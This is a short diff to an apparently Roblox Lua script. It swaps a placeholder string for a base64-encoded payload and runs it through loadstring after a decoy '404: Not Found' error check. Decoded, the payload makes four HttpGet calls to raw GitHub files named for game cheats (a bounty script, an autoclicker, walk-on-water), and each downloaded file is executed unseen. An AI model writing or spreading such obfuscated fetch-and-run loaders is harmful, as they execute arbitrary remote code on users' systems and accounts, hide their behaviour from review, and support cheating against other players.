@@ -2,6 +2,6 @@ if not game or not pcall(function() return game:GetService end) then
     error("404: Not Found")
 end
 
-local _="ywgqo dqmgr yhbuc muqyw aehqx jzdhb mhasv gosui xfacl fnyqw grahy nwdwa scvvc bxcro smpfo ksayh rvrmu jdzeg urajv tmezf tmcqr nrnxa nylwh znwji fjthp hadms fzaue iljbh hqhpb pcswm jtxtm jggwr lwmsw njpqi zdwra upyjb xqhvd darhb amsgo hsavo mnxnq pvfac fovua uzgcv rnbod tcaov vptxe ohypn rbdme sllmd zatrx zirla wrgtd vrkwl yrcid oyjtf xtbyv qkfvo sceua znzko vbrcj tudfu tujmg dfjys bypvq kfjco itpuq skmyo njfgj gdazt lylmp t"
+local _="bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vYmlpeWV1ZW0vdnRoYW5nc2l0aW5rL3JlZnMvaGVhZHMvbWFpbi9CYW5hbmFDYXQtQm91bnR5RXoubHVhIikpKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vYXV0b2NsaWNrZXIubHVhIikpKCkKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9uazIxMC9ibG9jcGh1dC9yZWZzL2hlYWRzL21haW4vZml4c3VzLmx1YSIpKSgpCmxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmsyMTAvYmxvY3BodXQvcmVmcy9oZWFkcy9tYWluL3dhbGtvbndhdGVyLmx1YSIpKSgp"
 local s=game:GetService("HttpService")
 loadstring(s:Base64Decode(_))()
